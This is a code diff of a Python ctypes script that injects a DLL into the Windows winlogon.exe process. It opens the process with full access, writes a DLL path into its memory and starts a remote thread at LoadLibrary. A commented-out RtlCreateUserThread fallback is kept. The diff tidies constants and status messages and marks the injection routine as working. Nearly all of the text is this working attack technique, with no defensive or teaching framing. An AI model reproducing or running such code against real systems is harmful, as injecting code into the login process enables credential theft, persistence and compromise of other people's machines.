@@ -14,6 +14,10 @@ PSIZE_T = POINTER(SIZE_T)
 
 # Define
 TH32CS_SNAPPROCESS = 0x02
+PROCESS_ALL_ACCESS =  0x1F0FFF
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_READWRITE = 0x04
     
 kernel32.VirtualAllocEx.restype = LPVOID
 kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, DWORD, PVOID]
@@ -60,26 +64,22 @@ def get_winlogon_pid():
         return None
     finally:
         kernel32.CloseHandle(process_snapshot)
-        
+
+## Working
 def inject_dll():
-    dll_path = r"C:\PATH\FILE.dll"
-    print(dll_path)
+    dll_path = b"C:\PATH\FILENAME.dll"
+    print("[*] DLL Path: " + str(dll_path, "utf-8"))
 
-    pid = get_winlogon_pid()
-    print(pid)
+    winlogon_pid = get_winlogon_pid()
+    print("[*] winlogon.exe PID: + " + str(winlogon_pid))
 
-    PROCESS_ALL_ACCESS =  0x1F0FFF
-    process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)
-    if not process_handle:
-        raise WinError()
-    print(process_handle)
+    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, winlogon_pid)
+    print("[*] Process Handle: " + str(process_handle))
 
-    mem_alloc_type = 0x00001000 | 0x00002000
-    PAGE_READWRITE = 0x04
-    alloc_mem = kernel32.VirtualAllocEx(process_handle, None, len(dll_path), mem_alloc_type, PAGE_READWRITE)
+    alloc_mem = kernel32.VirtualAllocEx(process_handle, None, len(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     if not alloc_mem:
         raise WinError()
-    print("Alloced: " + str(hex(alloc_mem)))
+    print("[*] Memory allocated for DLL path: " + str(hex(alloc_mem)))
 
     res = kernel32.WriteProcessMemory(process_handle, alloc_mem, dll_path, len(dll_path), None)
     if not res:
@@ -95,21 +95,23 @@ def inject_dll():
         load_lib_addr = kernel32.GetProcAddress(k32_module_addr, name)
 
         if load_lib_addr:
-            print("Function name: " + str(name))
+            print("[*] Function name: " + str(name))
             break
 
     if not load_lib_addr:
         raise WinError()
 
-    print("kernel32.dll: {}, LoadLibrary: {}".format(hex(k32_module_addr), hex(load_lib_addr)))
+    print("[*] kernel32.dll: {}, LoadLibrary: {}".format(hex(k32_module_addr), hex(load_lib_addr)))
 
+    input("[*] Press any key for DLL INJECTION >>>>>")
     thread_handle = kernel32.CreateRemoteThread(process_handle, None, None, load_lib_addr, alloc_mem, 0, None)
-    print(thread_handle)
+    print("[*] Thread Handle: " + str(thread_handle))
     if not thread_handle:
         raise WinError()
-
+    
+    # TODO: When CreateRemoteThread does not work, use this as a workaround
     #thread_handle = HANDLE()
     #ntdll.RtlCreateUserThread(process_handle, None, 0, 0, None, None, load_lib_addr, alloc_mem, byref(thread_handle), None)
 
     if kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF) == 0xFFFFFFFF:
-        raise WinError(
+        raise WinError()
